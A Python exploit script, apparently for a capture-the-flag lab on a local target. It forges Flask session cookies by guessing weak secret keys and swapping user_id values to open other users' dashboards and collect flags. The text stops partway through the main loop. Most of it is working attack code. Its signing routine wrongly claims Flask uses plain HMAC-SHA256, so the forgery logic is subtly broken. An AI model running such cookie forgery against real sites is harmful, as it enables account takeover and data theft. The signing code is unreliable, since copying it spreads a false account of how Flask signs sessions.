import requests
import json
import base64
import hashlib
import hmac
import urllib.parse

# Known Flask secret keys to test
SECRET_KEYS = ['secret', 'flask-secret', 'dev', 'development', 'test', 'testing', 'changeme', 'password', '123456', 'abcdef', 'abc123']

# Target URL configuration
BASE_URL = "http://127.0.0.1:32943"

print("=" * 80)
print("FLASK SESSION COOKIE IDOR TEST")
print("=" * 80)
print(f"\n[+] Target: {BASE_URL}")
print(f"[+] Testing {len(SECRET_KEYS)} secret keys")
print(f"[+] Testing user_id range: 10030-10040")
print(f"[+] Target endpoint: /dashboard")

# Step 1: Authenticate to get baseline session cookie
print("\n[+] Step 1: Authenticating with test:test credentials...")
try:
    login_data = {'username': 'test', 'password': 'test'}
    response = requests.post(f"{BASE_URL}/", data=login_data, allow_redirects=False)
    print(f"[+] Login response status: {response.status_code}")
    
    if 'set-cookie' in response.headers:
        session_cookie = response.cookies.get('session')
        print(f"[+] Session cookie obtained: {session_cookie}")
    else:
        print("[-] No session cookie in login response")
        print(f"[+] Response headers: {dict(response.headers)}")
        # Use the provided cookie from context if login fails
        session_cookie = "eyJ1c2VyX2lkIjoxMDAzMn0.aVLcqQ.GOiO-YgoHJypd9IrAVxUQ6Bol_s"
        print(f"[+] Using context cookie: {session_cookie}")
except Exception as e:
    print(f"[-] Error during login: {e}")
    session_cookie = "eyJ1c2VyX2lkIjoxMDAzMn0.aVLcqQ.GOiO-YgoHJypd9IrAVxUQ6Bol_s"
    print(f"[+] Using context cookie: {session_cookie}")

# Decode the original cookie to understand structure
print("\n[+] Step 2: Analyzing original cookie structure...")
try:
    if '.' in session_cookie:
        cookie_parts = session_cookie.split('.')
        payload_b64 = cookie_parts[0]
        
        # Add padding if needed
        padding = 4 - len(payload_b64) % 4
        if padding != 4:
            payload_b64 += '=' * padding
            
        decoded_payload = base64.urlsafe_b64decode(payload_b64)
        cookie_data = json.loads(decoded_payload)
        print(f"[+] Original cookie data: {cookie_data}")
        print(f"[+] Cookie parts: {len(cookie_parts)} ({cookie_parts[0]}, {cookie_parts[1]}, {cookie_parts[2]})")
except Exception as e:
    print(f"[-] Error decoding cookie: {e}")

def sign_cookie(payload_str, secret):
    """Sign a cookie payload with a given secret using Flask's algorithm"""
    # Extract the first two parts (payload.timestamp)
    if '.' in payload_str:
        parts = payload_str.split('.')
        if len(parts) >= 2:
            data_to_sign = f"{parts[0]}.{parts[1]}"
        else:
            data_to_sign = parts[0]
    else:
        data_to_sign = payload_str
        
    # Flask uses HMAC-SHA256
    sig = hmac.new(secret.encode(), data_to_sign.encode(), hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('=')
    return f"{data_to_sign}.{sig_b64}"

def decode_cookie_payload(cookie_str):
    """Decode just the payload part of the cookie"""
    try:
        if '.' in cookie_str:
            parts = cookie_str.split('.')
            payload_b64 = parts[0]
            
            padding = 4 - len(payload_b64) % 4
            if padding != 4:
                payload_b64 += '=' * padding
                
            decoded = base64.urlsafe_b64decode(payload_b64)
            return json.loads(decoded)
    except:
        return None
    
def create_modified_cookie(original_cookie, new_user_id, secret):
    """Create a new cookie with modified user_id and re-sign with secret"""
    try:
        # Decode original to get structure
        if '.' in original_cookie:
            parts = original_cookie.split('.')
            if len(parts) >= 2:
                payload_b64 = parts[0]
                timestamp_sig = parts[1]
                
                # Decode and modify payload
                padding = 4 - len(payload_b64) % 4
                if padding != 4:
                    payload_b64 += '=' * padding
                    
                payload_data = json.loads(base64.urlsafe_b64decode(payload_b64))
                payload_data['user_id'] = new_user_id
                
                # Re-encode payload
                new_payload = base64.urlsafe_b64encode(
                    json.dumps(payload_data, separators=(',', ':')).encode()
                ).decode('utf-8').rstrip('=')
                
                # Create new cookie string
                new_cookie_str = f"{new_payload}.{timestamp_sig}"
                
                # Re-sign with secret
                return sign_cookie(new_cookie_str, secret)
    except Exception as e:
        print(f"[-] Error creating modified cookie: {e}")
        return None

# Step 3: Test each secret key with modified user_ids
print("\n[+] Step 3: Testing secret keys and user_id modifications...")

# Track findings
accessible_users = {}
found_flags = []
total_requests = 0
user_ids_to_test = range(10030, 10041)  # 10030-10040 inclusive

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'X-UserId': '10032'  # Default header value
}

for secret in SECRET_KEYS:
    print(f"\n{'='*80}")
    print(f"[+] Testing secret key: '{secret}'")
    print(f"{'='*80}")
    
    for user_id in user_ids_to_test:
        total_requests += 1
        
        # Create modified cookie
